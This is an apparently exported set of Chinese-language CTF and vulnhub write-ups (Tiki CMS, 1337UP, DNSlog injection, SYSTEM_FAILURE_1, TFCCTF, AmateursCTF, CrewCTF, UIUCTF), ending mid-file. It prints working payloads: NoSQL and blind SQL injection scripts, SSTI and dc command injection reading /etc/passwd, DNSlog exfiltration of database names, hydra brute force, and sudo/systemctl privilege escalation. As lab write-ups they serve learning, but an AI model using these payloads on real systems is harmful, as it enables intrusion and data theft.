Boss.\n\n~~~\n\n可以看到cms的密码，登录之后没什么用。\n\n查看cms有没有什么历史漏洞\n\n`searchsploit tiki cms`\n\n~~~\n---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                            |  Path\n---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nTiki Wiki CMS 15.0 - Arbitrary File Download                                                                                                              | php/webapps/40080.txt\nTiki Wiki CMS Calendar 6.15/9.11 LTS/12.5 LTS/14.2 - Remote Code Execution                                                                                | php/webapps/39965.txt\nTiki Wiki CMS Groupware - 'url' Open Redirection                                                                                                          | php/webapps/36848.txt\nTiki Wiki CMS Groupware 21.1 - Authentication Bypass                                                                                                      | php/webapps/48927.py\nTiki Wiki CMS Groupware 5.2 - Multiple Vulnerabilities                                                                                                    | php/webapps/15174.txt\nTiki Wiki CMS Groupware 7.2 - 'snarf_ajax.php' Cross-Site Scripting                                                                                       | php/webapps/35974.txt\nTiki Wiki CMS Groupware 8.1 - 'show_errors' HTML Injection                                                                                                | php/webapps/36470.txt\nTiki Wiki CMS Groupware 8.2 - 'snarf_ajax.php' Remote PHP Code Injection                                                                                  | php/webapps/18265.txt\nTiki Wiki CMS Groupware 8.3 - 'Unserialize()' PHP Code Execution                                                                                          | php/webapps/19573.php\nTiki Wiki CMS Groupware 8.3 - 'Unserialize()' PHP Code Execution (Metasploit)                                                                             | php/webapps/19630.rb\n---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\nPapers: No Results\n\n~~~\n\n查看web服务cms的版本用dirsearch可以找到一个changelog\n\n访问可以看到版本为21.1，正好有一个历史漏洞\n\n用`searchsploit tiki cms -m 48927 `将脚本下载下来运行，重置admin的密码为空,然后用admin登录bp抓包修改登录密码为空，成功登录。在lastchange的Credentials里可以找到`silky:Agy8Y7SPJNXQzqA `这个是ssh的密码，用ssh连接，查看id，发现用户在sodu组下，可以直接sudo su提权。\n\n# 小结\t\t\n\n一开始靶场搭建的时候出了点问题导致发现不了靶机的地址，是因为我的攻击机和靶机不在一个局域网内，将靶机的网卡和攻击机桥接在一起就可以了\n\n记录下来的只有正确的路线，渗透过程中还要去试着探索其他的功能点\n","tags":["vulnhub"],"categories":["boot2root"]},{"title":"1337_UP_LIVE_CTF 2023","url":"/2023/11/22/1337_up_live_Ctf/","content":"\n\n\n## CTFC\n\n刷题的时候见到过这种题，其实就是注入+爆破嘛，但之前遇到的是sql注入的，这说明现在数据库类型见的不多\n\n题目给了一个附件\n\n~~~python\n#app.py\nfrom flask import Flask,render_template,request,session,redirect\nimport pymongo\nimport os\nfrom functools import wraps\nfrom datetime import timedelta\nfrom hashlib import md5\nfrom time import sleep\n\napp = Flask(__name__)\napp.secret_key = os.environ['SECRET_KEY']\n\n# db settings\nclient = pymongo.MongoClient('localhost',27017)\ndb = client.ctfdb\n\ndef createChalls():\n\tdb.challs.insert_one({\"_id\": \"28c8edde3d61a0411511d3b1866f0636\",\"challenge_name\": \"Crack It\",\"category\": \"hash\",\"challenge_description\": \"My friend sent me this random string `cc4d73605e19217bf2269a08d22d8ae2` can you identify what it is? , flag format: CTFC{<password>}\",\"challenge_flag\": \"CTFC{cryptocat}\",\"points\": \"500\",\"released\": \"True\"})\n\tdb.challs.insert_one({\"_id\": \"665f644e43731ff9db3d341da5c827e1\",\"challenge_name\": \"MeoW sixty IV\",\"category\": \"crypto\",\"challenge_description\": \"hello everyoneeeeeeeee Q1RGQ3tuMHdfZzBfNF90aDNfcjM0TF9mbDRHfQ==, oops sorry my cat ran into my keyboard, and typed these random characters\",\"challenge_flag\": \"CTFC{n0w_g0_4_th3_r34L_fl4G}\",\"points\": \"1000\",\"released\": \"True\"})\n\tdb.challs.insert_one({\"_id\": \"38026ed22fc1a91d92b5d2ef93540f20\",\"challenge_name\": \"ImPAWSIBLE\",\"category\": \"web\",\"challenge_description\": \"well, this challenge is not fully created yet, but we have the flag for it\",\"challenge_flag\": os.environ['CHALL_FLAG'],\"points\": \"1500\",\"released\": \"False\"})\n\n# login check\ndef check_login(f):\n\t@wraps(f)\n\tdef wrap(*args,**kwrags):\n\t\tif 'user' in session:\n\t\t\treturn f(*args,**kwrags)\n\t\telse:\n\t\t\treturn render_template('dashboard.html')\n\treturn wrap\n\n# routes\nfrom user import routes\n\n@app.route('/')\n@check_login\ndef dashboard():\n\tchalls = []\n\tfor data in db.challs.find():\n\t\tdel data['challenge_flag']\n\t\tchalls.append(data)\t\n\tchall_1 = challs[0]\n\tchall_2 = challs[1]\n\treturn render_template('t_dashboard.html',username=session['user']['username'],chall_1=chall_1,chall_2=chall_2)\n\n@app.route('/register')\ndef register():\n\treturn render_template('register.html')\n\n@app.route('/login')\ndef login():\n\treturn render_template('login.html')\n\n@app.route('/logout')\ndef logout():\n\tsession.clear()\n\treturn redirect('/')\n\n@app.route('/submit_flag',methods=['POST'])\n@check_login\ndef submit_flag():\n\t_id = request.json.get('_id')[-1]\n\tsubmitted_flag = request.json.get('challenge_flag')\n\tchall_details = db.challs.find_one(\n\t\t\t{\n\t\t\t\"_id\": md5(md5(str(_id).encode('utf-8')).hexdigest().encode('utf-8')).hexdigest(),\n\t\t\t\"challenge_flag\":submitted_flag\n\t\t\t}\n\t)\n\tif chall_details == None:\n\t\treturn \"wrong flag!\"\n\telse:\n\t\treturn \"correct flag!\"\n\n# wait untill mongodb start then create the challs in db\nsleep(10)\ncreateChalls()\n~~~\n\n能看出是`MongoDB`可以用`$regex` 进行正则匹配\n\nexp:\n\n~~~\nimport requests, string\nfrom urllib3.exceptions import InsecureRequestWarning\n\nrequests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)\n\nheaders = {\n    'Content-Type': 'application/json'\n}\n\ncookies = {\n    'session': 'eyJ1c2VyIjp7Il9pZCI6IjNhZDFlZGRlODNkMzRmMjhiZTMwMDdiYTIxOWQzZDUyIiwidXNlcm5hbWUiOiJhc2Rhc2QifX0.ZVoXtA.-obI_0v_QOu3KgulYZCyrYukpiM'\n}       #登录的session\n\nflag = ''\n\nwhile True:\n    for l in string.ascii_letters + string.digits + \"_{}\":\n        data = '{\"_id\":\"_id:3\",\"challenge_flag\":{\"$regex\":\"^' + flag + l + '.*\"}}'\n        print(data)\n        data = requests.post('https://ctfc2.ctf.intigriti.io/submit_flag', data = data, headers = headers, cookies = cookies, verify=False)\n        print(data.text)\n        if 'correct flag!' in data.text:\n            flag += l\n            print(flag)\n            break\n    else:\n        print('Failed')\n        exit(1)\n\n~~~\n\n## Bug Bank\n\n有两种解法，预期解我也没看懂，非预期解就很简单了，通过转钱的功能转`-100000000`原账号就会减`-100000000`就会变成正的，就可以买flag了\n\n预期解可以参考：\n\n~~~\nhttps://github.com/opabravo/security-writeups/blob/main/ctf/2023-11-17%20Intigriti%201337up%20CTF%202023.md\n\nhttps://portswigger.net/research/hijacking-service-workers-via-dom-clobbering\n~~~\n\n## Smarty Pants\n\n~~~\n#index.php\n<?php\nif(isset($_GET['source'])){\n    highlight_file(__FILE__);\n    die();\n}\n\nrequire('/var/www/vendor/smarty/smarty/libs/Smarty.class.php');\n$smarty = new Smarty();\n$smarty->setTemplateDir('/tmp/smarty/templates');\n$smarty->setCompileDir('/tmp/smarty/templates_c');\n$smarty->setCacheDir('/tmp/smarty/cache');\n$smarty->setConfigDir('/tmp/smarty/configs');\n\n$pattern = '/(\\b)(on\\S+)(\\s*)=|javascript|<(|\\/|[^\\/>][^>]+|\\/[^>][^>]+)>|({+.*}+)/';\n\nif(!isset($_POST['data'])){\n    $smarty->assign('pattern', $pattern);\n    $smarty->display('index.tpl');\n    exit();\n}\n\n// returns true if data is malicious\nfunction check_data($data){\n\tglobal $pattern;\n\treturn preg_match($pattern,$data);\n}\n\nif(check_data($_POST['data'])){\n    $smarty->assign('pattern', $pattern);\n    $smarty->assign('error', 'Malicious Inputs Detected');\n    $smarty->display('index.tpl');\n    exit();\n}\n\n$tmpfname = tempnam(\"/tmp/smarty/templates\", \"FOO\");\n$handle = fopen($tmpfname, \"w\");\nfwrite($handle, $_POST['data']);\nfclose($handle);\n$just_file = end(explode('/',$tmpfname));\n$smarty->display($just_file);\nunlink($tmpfname);\n~~~\n\n用换行符绕过即可\n\n## Bug Report Repo\n\n首先是sql盲注，数据库是`sqlite`，自己写的脚本，效率不够，还是得靠sqlmap\n\n~~~  py\nimport websocket\nimport string\nimport json\nstr=string.ascii_letters+string.digits+string.punctuation\nws = websocket.WebSocket()\nws.connect(\"wss://bountyrepo.ctf.intigriti.io/ws\")\nflag=''\nfor j in range(1,300):\n    aaa=False\n    for i in str:\n        # data={\"id\":f\"11 and length(sqlite_version())={j}\"}判断数据库长度\n        # data={\"id\":f\"11 AND SUBSTR((SELECT COUNT(tbl_name) FROM sqlite_master WHERE type='table'),1,1)=CHAR({j})\"}判断表长度\n        #data={\"id\":f\"11 and substr((select group_concat(tbl_name) from sqlite_master where type='table' limit 0,1),{j},1)='{i}'\"}\n        data = {\"id\": f\"11 and substr((select group_concat(sql) from sqlite_master),{j},1)='{i}'\"}\n        data=json.dumps(data)\n        #print(data)\n        ws.send(data)\n        a=ws.recv()\n        print(a)\n        if 'Bug report from ethical_hacker is Open' in a:\n            aaa=True\n            flag+=i\n            print(flag)\n            break\n            #continue\n    if aaa == False:\n        print(\"ok\")\n        break\n\n~~~\n\n附一个别的师傅写的脚本\n\n~~~py\nimport string\nfrom websockets.sync.client import connect\nimport json\n\nURL = 'bountyrepo.ctf.intigriti.io'\n# ALPHABET = string.ascii_uppercase # string.ascii_letters + '{!_}'\nALPHABET = string.digits + '.'\nPAYLOAD = \"1 AND (select sqlite_version()) LIKE '{guess}%' -- -\"\n\n# flag = 'INTIGRITI' \nflag = '' \nwith connect(f\"wss://{URL}/ws\") as websocket:\n    while True:\n        for c in ALPHABET:\n            payload = PAYLOAD.format(guess=flag + c)\n            print('\\r>>>', payload, end='')\n            websocket.send(json.dumps({\"id\": payload}))\n            message = websocket.recv()\n            if 'Bug not found!' not in message:\n                flag += c\n                print()\n                print(flag)\n                break\n\n\n'''\n# PAYLOAD = \"1 AND (SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%') LIKE '{tables}%' -- -\"\n# tables = \"bug_reports\"\n# PAYLOAD = \"1 AND (SELECT GROUP_CONCAT(name) FROM PRAGMA_TABLE_INFO('bug_reports')) LIKE '{guess}%' --\"\n# columns = 'id,category,description,severity,cvss_score,status,reported_by,reported_date'\n'''\n~~~\n\n\n\n爆出来的一条有用的东西\n\n~~~\ncrypt0:c4tz on /4dm1n_z0n3, really?!\n~~~\n\n访问是一个登录页面，用给的用户名密码登录，他是得是admin，那就是jwt，但是不知道密钥啊，这个时候就用到了一个工具`jwt-cracker`爆破密钥，字典用`rockyou`，key是`catsarethebest`，伪造admin就ok了\n\n## Pizza Time\n\n只有一处功能点....\n\n~~~\nsudo nmap -sVC -T4 -Pn -vv -p 443 pizzatime.ctf.intigriti.io\n~~~\n\n探测web服务，用的是ngnix，可以猜测是`Flask/Django`或者`node`\n\n首先fuzz，可以看出除了`&`和`+`的所有的特殊字符都被过滤了大括号也被过滤了，难道不是`SSTI`么？不！他就是SSTI,`%0a`可以绕过，具体原理是什么我得分析分析源码再写\n\npayload:\n\n~~~\nx%0a{{lipsum.__globals__[\"os\"].popen('cat+/etc/passwd').read()}}\n~~~\n\n但是这样会报500，将命令放进header里就可以绕过了\n\n~~~\nx%0a{{lipsum.__globals__[\"os\"].popen(request.headers.get(\"X\")).read()}}\n~~~\n\n","tags":["ctf"],"categories":["ctf","复盘"]},{"title":"dnslog注入学习","url":"/2023/10/18/dnslog注入学习/","content":"\n## 什么是DNSlog\n\nDNS（Domain Name System）域名服务系统，简单的说就是域名与IP转换服务，比如用户输入a.com,DNS就会将a.com解析找到它真实的ip，以便于访问服务器上的相关服务，DNSlog就是存储在DNS服务器上的域名信息，它记录着用户对域名访问的信息，类似于日志文件。\n\n## DNSlog回显原理\n\n首先我们先了解一下多级域名的概念\n\n[域名分级与域名解析过程(DNS)](https://blog.csdn.net/m0_37263637/article/details/85157611)\n\n因特网采用层次树状结构命名方法。域是名字空间中一个可被管理的划分（按机构组织划分），域可被划分为子域，子域可再被划分，即形成了顶级域名、二级域名、三级域名等。从右向左为顶级域名、二级域名、三级域名等，用点隔开。例如`872323857.github.io`，io就是顶级域名，github就是二级域名，872323857就是三级域名。且域名不分大小写。\n\n![](/pic/DNSLOG/DNSLOG.png)\n\n通俗的说就是我有个已注册的域名a.com，我在域名代理商那里将域名设置对应的ip 1.1.1.1  上，这样当我向dns服务器发起a.com的解析请求时，DNSlog中会记录下他给a.com解析，解析值为1.1.1.1，而我们这个解析的记录的值就是我们要利用的地方。\n\n自己操作一下才能更好的理解，首先在http://www.dnslog.cn/上获得一个域名，然后我们ping一下\n\n![](/pic/DNSLOG/DNSLOG2.png)\n\n我们将1换成别的试试\n\n![](/pic/DNSLOG/DNSLOG3.png)\n\n可以看到解析的日志会把%USERNAME%的值给带出来，因为系统在ping命令之前会将%USERNAME%的值解析出来，然后再和域名拼接起来。\n\n## DNSlog利用\n\n### sql注入\n\n![](/pic/DNSLOG/DNSLOG4.png)\n\n就以sql盲注为例，后端数据库用的mysql数据库，说一下用dnslog回显只能用于windows系统，为什么呢。因为在利用sql盲注进行DNSlog回显时，需要用到load_file函数，这个函数可以进行DNS请求。那\n和只能在windows上用有什么关系呢，这里就涉及到Windows的一个小Tips——**UNC路径**\n\n### UNC路径\n\nUNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。\n \\abc.xxx\\test\n这也就解释了为什么CONCAT()函数拼接了4个\\了,双斜杠表示网络资源路径多加两个\\就是转义了反斜杠。\n 通过DNSlog盲注需要用的load_file()函数，所以一般得是root权限。`show variables like '%secure%'`;查看load_file()可以读取的磁盘。\n 1、当secure_file_priv为空，就可以读取磁盘的目录。\n 2、当secure_file_priv为G:\\，就可以读取G盘的文件。\n 3、当secure_file_priv为null，load_file就不能加载文件。\n 通过设置my.ini来配置。secure_file_priv=\"\"就是可以load_flie任意磁盘的文件。\n\n在mysql中执行命令`select load_file('\\\\\\\\a.a92pjl.dnslog.cn\\\\a');`可以看到\n\n![](/pic/DNSLOG/DNSLOG5.png)\n\n和之前的结合起来构造语句,用sqli靶场来测试\n\n~~~\n' and if((select load_file(concat('\\\\\\\\',(select database()),'.\nbhf0ay.dnslog.cn\\\\abc'))),1,0)--+\n~~~\n\n![](/pic/DNSLOG/DNSLOG6.png)\n\n## 小结\n\nDNSlog注入不止可以用于sql注入，还可以用于xss，xxe，ssrf等，思路打开。\n\n可以参考：\n\nhttps://www.cnblogs.com/Xy--1/p/12896599.html\n","tags":["web","sql注入"],"categories":["web"]},{"title":"SYSTEM_FAILURE_1靶场","url":"/2023/09/16/SYSTEM-FAILURE-1靶场/","content":"\n跟着别人的视频打一下。\n\n靶场直接就给了ip地址，用nmap扫一下端口\n\n![](/pic/sf1/1.png)\n\n开放了445端口,445端口默认开放的是SMB服务，可以利用相关的工具,`smbclient`、`smbmap`\n\n![](/pic/sf1/2.png)\n\n用`smbmap`扫描可以发现有一个匿名的共享,用`smbclient` //ip/anonymous连接，空密码直接回车就行。\n\n![](/pic/sf1/3.png)\n\n查看文件发现只有一个share，用`get share`下载下来,查看share文件。\n\n![](/pic/sf1/4.png)\n\n给了`Admin`和`89492D216D0A212F8ED54FC5AC9D340B`，猜测是账号密码，md5解密得`qazwsxedc`，用xftp连接，或者用lftp连接也可以。\n\n![](/pic/sf1/5.png)\n\nftp可以连接，ssh试过之后也可以连接。利用`linpeas.sh`搜集一下有没有可以提权的东西\n\n> 工具地址：https://github.com/carlospolop/PEASS-ng\n\n![](/pic/sf1/6.png)\n\n但是用户权限太低，没有办法提权。\n\ncd到/Syst3m/F4iluR3,里面有很多文件\n\n![](/pic/sf1/7.png)\n\n他们的大小也都差不多，用`find ./ -size +1696c`命令找一下有没有不正常的文件,确实能找到`file0189.txt`，用`diff`命令可以比一下他与其他的文件有什么不同，但是发现文件内容是一行的，所以要给他们变成单行的。\n\n`cat file0189.txt |xargs -n 1 > /tmp/tmp1` `cat file.txt |xargs -n 1 > /tmp/tmp1`然后再用diff判断他们有什么不同。\n\n\n\n![](/pic/sf1/9.png)\n\n发现后面有一串不一样的，需要解密，base62解密得到`/Sup3rS3cR37`\n\n这个文件夹在`/var/www/html/area4`里,下载useful.txt，查看`/etc/passwd`能发现用户名，利用`hydra`进行爆破\n\n![](/pic/sf1/10.png)\n\n命令:`hydra -L user.txt -P useful.txt ssh://192.168.2.243 -V -I -u -e nsr`  \n\n~~~\n-V 显示详细信息\n-I 忽略现有的恢复文件（不要等待 10 秒）\n-e “n”表示空密码，“s”尝试登录为通过，“r”尝试反向登录为通过\n~~~\n\n![](/pic/sf1/11.png)\n\n可以爆破出来密码，登录valex用户。\n\n![](/pic/sf1/12.png)\n\n`sudo -l`：列出用户可以执行和不可以执行的命令。\n\n可以发现`jin`用户可以用pico。在网上能找到nano的提权方式\n\n执行命令`sudo -u jin /usr/bin/pico` 然后\n\n~~~\n^R^X\nreset; sh 1>&0 2>&0\n~~~\n\n![](/pic/sf1/14.png)\n\n然后就到`jin`这个用户了,这个时候就可以执行`systemctl`了，这个时候就可以用`systemctl`进行提权。\n\n~~~\nTF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"chmod +s /bin/bash\"\n[Install]\nWantedBy=multi-user.target' > $TF\n./systemctl link $TF\n./systemctl enable --now $TF\n~~~\n\n或者修改sudoers\n\n~~~\necho \\\"admin ALL=(ALL:ALL) ALL\">>/etc/sudoers\n~~~\n\n![](/pic/sf1/15.png)\n\n读取到root.txt\n","tags":["vulnhub"],"categories":["boot2root"]},{"title":"TFCCTF2023","url":"/2023/08/01/TFCCTF2023/","content":"\n# FORENSICS\n\n## DOWN BAD\n\n修改图片的高度就能得到flag\n\n## LIST\n\n比赛的时候与正确答案插肩而过了，我真该死啊。\n\n附件给了一个流量包，追踪TCP流能发现有类似`command=echo+%22ZmluZCAvaG9tZS9jdGYgLXR5cGUgZiAtbmFtZSAiRiIgMj4vZGV2L251bGw%3D%22+%7C+base64+-d+%7C+bash`这种，解码是` find /home/ctf -type f -name \"T\" 2>/dev/null`多解码几个可以发现-name的参数就是flag\n\n可以用`strings list.pcap|grep command`这个代码找到所有的flag，用脚本解码快一点，一个一个解码也可以。\n\n~~~\nimport base64\n\ntraces = open(\"./2.txt\", \"r\").readlines()\n\nbase64_commands = []\n\nfor t in traces:\n    t = t.replace(\"command=echo+%22\", \"\")\n    t = t.replace(\"%22+%7C+base64+-d+%7C+bash\", \"\")\n    t = t.replace(\"%3D\", \"\")\n    t = t.strip()\n\n    print(base64.b64decode(t + \"=\" * (len(t) % 4)).decode()[30], end=\"\")\n\n~~~\n\n","tags":["ctf"],"categories":["ctf","复盘"]},{"title":"AmateursCTF2023","url":"/2023/07/19/AmateursCTF2023/","content":"\n# WEB\n\n## waiting-an-eternity\n\n![](/pic/AmateursCTF/web1.png)\n\n看文件头，要等好长事件之后才会刷新,直接访问后面的url\n\n![](/pic/AmateursCTF/web2.png)\n\nsecretcode是md5解密，但是没什么用，Cookie里有`time`是时间戳将他改成`NAN`显示flag\n\n![](/pic/AmateursCTF/web3.png)\n\n## funny factorials\n\n附件给了一个app.py\n\n可控点在这里，通过改变主题得到flag\n\n~~~\ndef filter_path(path):\n    # print(path)\n    path = path.replace(\"../\", \"\")\n    try:\n        return filter_path(path)\n    except RecursionError:\n        # remove root / from path if it exists\n        if path[0] == \"/\":\n            path = path[1:]\n        print(path)\n        return path\n\n~~~\n\n将path里面的`../`删掉了，如果path开头是`/`会忽视掉，但是如果递归超过1000次就会进入`RecursionError`然后访问根目录下的flag.txt就行\n\npayload:\n\n~~~\nPOST /?themeflag.txt\n~~~\n\n## latek\n\n关于latek可以看看这篇文章https://www.freebuf.com/articles/security-management/308191.html\n\n![](/pic/AmateursCTF/web4.png)\n\n直接用\\input的话flag输出不完全，问了chatgpt可以用其他方法进行任意文件读取\n\n~~~\n\\documentclass{article}\n\\usepackage{verbatim}\n\\begin{document}\nHello, world!\n\\verbatiminput{/flag.txt}\n\\end{document}\n\n~~~\n\n# REV\n\n## volcano\n\nida分析，先看main函数\n\n~~~c\n__int64 __fastcall main(int a1, char **a2, char **a3)\n{\n  __int64 v4; // rbx\n  __int64 v5; // rbx\n  __int64 v6; // rbx\n  unsigned __int64 v7; // [rsp+8h] [rbp-C8h] BYREF\n  unsigned __int64 v8; // [rsp+10h] [rbp-C0h] BYREF\n  unsigned __int64 v9; // [rsp+18h] [rbp-B8h] BYREF\n  unsigned __int64 v10; // [rsp+20h] [rbp-B0h]\n  FILE *stream; // [rsp+28h] [rbp-A8h]\n  char s[136]; // [rsp+30h] [rbp-A0h] BYREF\n  unsigned __int64 v13; // [rsp+B8h] [rbp-18h]\n\n  v13 = __readfsqword(0x28u);\n  setbuf(stdin, 0LL);\n  setbuf(stdout, 0LL);\n  setbuf(stderr, 0LL);\n  printf(\"Give me a bear: \");\n  v7 = 0LL;\n  __isoc99_scanf(\"%llu\", &v7);\n  if ( !sub_12BB(v7) )\n  {\n    puts(\"That doesn't look like a bear!\");\n    return 1LL;\n  }\n  else\n  {\n    printf(\"Give me a volcano: \");\n    v8 = 0LL;\n    __isoc99_scanf(\"%llu\", &v8);\n    if ( (unsigned __int8)sub_13D9(v8) != 1 )\n    {\n      puts(\"That doesn't look like a volcano!\");\n      return 1LL;\n    }\n    else\n    {\n      printf(\"Prove to me they are the same: \");\n      v9 = 0LL;\n      v10 = 4919LL;\n      __isoc99_scanf(\"%llu\", &v9);\n      if ( (v9 & 1) != 0 && v9 != 1 )\n      {\n        v4 = sub_1209(v8);\n        if ( v4 == sub_1209(v7)\n          && (v5 = sub_124D(v8), v5 == sub_124D(v7))\n          && (v6 = sub_1430(v10, v8, v9), v6 == sub_1430(v10, v7, v9)) )\n        {\n          puts(\"That looks right to me!\");\n          stream = fopen(\"flag.txt\", \"r\");\n          fgets(s, 128, stream);\n          puts(s);\n          return 0LL;\n        }\n        else\n        {\n          puts(\"Nope that's not right!\");\n          return 1LL;\n        }\n      }\n      else\n      {\n        puts(\"That's not a valid proof!\");\n        return 1LL;\n      }\n    }\n  }\n}\n~~~\n\n先看`sub_12BB`和`sub_13D9`这两个\n\n~~~c\n_BOOL8 __fastcall sub_12BB(unsigned __int64 a1)\n{\n  if ( (a1 & 1) != 0 )\n    return 0LL;\n  if ( a1 % 3 != 2 )\n    return 0LL;\n  if ( a1 % 5 != 1 )\n    return 0LL;\n  if ( a1 % 7 == 3 )\n    return a1 % 109 == 55;\n  return 0LL;\n}\n~~~\n\n~~~\n_BOOL8 __fastcall sub_13D9(unsigned __int64 a1)\n{\n  unsigned __int64 v2; // [rsp+8h] [rbp-10h]\n\n  v2 = 0LL;\n  while ( a1 )\n  {\n    v2 += a1 & 1;\n    a1 >>= 1;\n  }\n  return v2 > 16 && v2 <= 26;\n}\n~~~\n\n逻辑很简单，写脚本爆破一下就行\n\n看后面\n\n~~~\n if ( v4 == sub_1209(v7)\n          && (v5 = sub_124D(v8), v5 == sub_124D(v7))\n          && (v6 = sub_1430(v10, v8, v9), v6 == sub_1430(v10, v7, v9)) )\n~~~\n\n前几个完全没用只用考虑最后一个括号里的内容就行。\n\nsub_1430:\n\n~~~c\nunsigned __int64 __fastcall sub_1430(unsigned __int64 a1, unsigned __int64 a2, unsigned __int64 a3)\n{\n  unsigned __int64 v5; // [rsp+10h] [rbp-18h]\n  unsigned __int64 v6; // [rsp+20h] [rbp-8h]\n\n  v6 = 1LL;\n  v5 = a1 % a3;\n  while ( a2 )\n  {\n    if ( (a2 & 1) != 0 )\n      v6 = v5 * v6 % a3;\n    a2 >>= 1;\n    v5 = v5 * v5 % a3;\n  }\n  return v6;\n}\n~~~\n\n直接写脚本爆破就行了\n\nexp:\n\n~~~python\ndef check1(a1):\n    if a1 & 1 != 0:\n        return 0\n    if a1 % 3 != 2:\n        return 0\n    if a1 % 5 != 1:\n        return 0\n    if a1 % 7 == 3:\n        return a1 % 109 == 55\n    return 0\ndef check2(a1):\n    v2 = 0\n    while a1:\n        v2 += a1 & 1\n        a1 >>= 1\n    return 16 < v2 <= 26\ndef s():\n    for i in range(1,10000000):\n        if check1(i) and check2(i):\n            print(i)\ndef a():\n        for i in range(1,10):\n            if ((i & 1) != 0 and (i!= 1)):\n                print(i)\ns() #输出前两个数\na() #输出第三个数\n~~~\n\nbear和volcano的数值一样。\n\n# MISC\n\n# Censorship\n\n给了一个main.py\n\n~~~python\n#!/usr/local/bin/python\nfrom flag import flag\n\nfor _ in [flag]:\n    while True:\n        try:\n            code = ascii(input(\"Give code: \"))\n            if \"flag\" in code or \"e\" in code or \"t\" in code or \"\\\\\" in code:\n                raise ValueError(\"invalid input\")\n            exec(eval(code))\n        except Exception as err:\n            print(err)\n\n~~~\n\n\n\n可以执行python的命令,但是不能有`flag`,`e`,`t`，flag是被定义的但是print里有t没有办法回显，可以用python的内置函数获得print。\n\npayload:\n\n~~~\nvars(globals()[dir()[2]])[globals()[dir()[2]].__dir__()[42]](globals())\n~~~\n\n","tags":["ctf"],"categories":["ctf"]},{"title":"CrewCTF","url":"/2023/07/11/CrewCTF/","content":"\n# WEB\n\n## sequence_gallery \t\t\t\t\t\n\n下载附件\n\n~~~python\n#main.py\nimport os\nimport sqlite3\nimport subprocess\n\nfrom flask import Flask, request, render_template\n\napp = Flask(__name__)\n\n@app.get('/')\ndef index():\n\tsequence = request.args.get('sequence', None)\n\tif sequence is None:\n\t\treturn render_template('index.html')\n\n\tscript_file = os.path.basename(sequence + '.dc') #构造脚本名,将sequence和.dc字符串连接起来，并获取路径中的文件名部分。\n\tif ' ' in script_file or 'flag' in script_file:\n\t\treturn ':('\n\n\tproc = subprocess.run(     #运行dc命令\n\t\t['dc', script_file], \n\t\tcapture_output=True,\n\t\ttext=True,\n\t\ttimeout=1,\n\t)\n\toutput = proc.stdout\n\n\treturn render_template('index.html', output=output)\n\nif __name__ == '__main__':\n\tapp.run(host='0.0.0.0', port=8080)\n\n~~~\n\n~~~\nsubprocess.run(args, *, stdin=None, input=None, stdout=None, stderr=None, capture_output=False, shell=False, cwd=None, timeout=None, check=False, encoding=None, errors=None, text=None, env=None, universal_newlines=None)\n\nargs：表示要执行的命令。必须是一个字符串，字符串参数列表。\nstdin、stdout 和 stderr：子进程的标准输入、输出和错误。其值可以是 subprocess.PIPE、subprocess.DEVNULL、一个已经存在的文件描述符、已经打开的文件对象或者 None。subprocess.PIPE 表示为子进程创建新的管道。subprocess.DEVNULL 表示使用 os.devnull。默认使用的是 None，表示什么都不做。另外，stderr 可以合并到 stdout 里一起输出。\ntimeout：设置命令超时时间。如果命令执行时间超时，子进程将被杀死，并弹出 TimeoutExpired 异常。\ncheck：如果该参数设置为 True，并且进程退出状态码不是 0，则弹 出 CalledProcessError 异常。\nencoding: 如果指定了该参数，则 stdin、stdout 和 stderr 可以接收字符串数据，并以该编码方式编码。否则只接收 bytes 类型的数据。\nshell：如果该参数为 True，将通过操作系统的 shell 执行指定的命令。\n~~~\n\n在`subprocess.run()`中`shell`没等于`TRUE`但是容易受到参数的影响\n\n![](/pic/CrewCTF/web1.png)\n\n在kali里用man命令看dc的文档\n\n![](/pic/CrewCTF/web1.1.png)\n\n用`-e`和`!`可以执行命令,空格被过滤了，用其他符号绕过，在最后需要加上`%0a`表示输入了ENTER\n\npayload:`?sequence=-e${IFS}!cat${IFS}*.txt%0A`\n\n得到flag:`crew{10 63 67 68 101 107 105 76 85 111 68[dan10!=m]smlmx} `\n\n放到kali里用dc命令转换为真实的flag\n\n![](/pic/CrewCTF/web1.2.png)\n","tags":["ctf"],"categories":["ctf","复盘"]},{"title":"UIUCTF2023","url":"/2023/07/04/UIUCTF023/","content":"\n# MISC\n\n## vimjail1            \n\n这道题一连接就是插入模式，想办法退出插入模式.\n\n~~~\n#entry.sh\n#!/usr/bin/env sh\n\nchmod -r /flag.txt\n\nvim -R -M -Z -u /home/user/vimrc\n\n~~~\n\n以只读、文本不可修改、限制模式、启动并且用`/home/user/vimrc`替代了原有的.vimrc\n\n~~~\n#vimrc\nset nocompatible\nset insertmode\n# 禁用了兼容模式，并且默认启动插入模式\ninoremap <c-o> nope\ninoremap <c-l> nope\ninoremap <c-z> nope\ninoremap <c-\\><c-n> nope\n# 将这些组合键转换为插入单词nope\n~~~\n\n但是可以按两次`ctrl+\\`再按一次`ctrl+n`来绕过，然后用`:e`来读取flag。\n\n`:e`表示编辑一个文件\n\n![](/pic/uiu/vim1.png)\n\n##  vimjail2    \n\n~~~sh\n#entry.sh\n#!/usr/bin/env sh\n\nvim -R -M -Z -u /home/user/vimrc -i /home/user/viminfo\n\ncat /flag.txt\n~~~\n\n以只读模式、文本不可修改、限制模式启动vim，替换了原有的vimrc和viminfo\n\n ~~~\n #vimrc\n set nocompatible\n set insertmode\n \n inoremap <c-o> nope\n inoremap <c-l> nope\n inoremap <c-z> nope\n inoremap <c-\\><c-n> nope\n \n cnoremap a _\n cnoremap b _\n cnoremap c _\n cnoremap d _\n cnoremap e _\n cnoremap f _\n cnoremap g _\n cnoremap h _\n cnoremap i _\n cnoremap j _\n cnoremap k _\n cnoremap l _\n cnoremap m _\n cnoremap n _\n cnoremap o _\n cnoremap p _\n cnoremap r _\n cnoremap s _\n cnoremap t _\n cnoremap u _\n cnoremap v _\n cnoremap w _\n cnoremap x _\n cnoremap y _\n cnoremap z _\n cnoremap ! _\n cnoremap @ _\n cnoremap 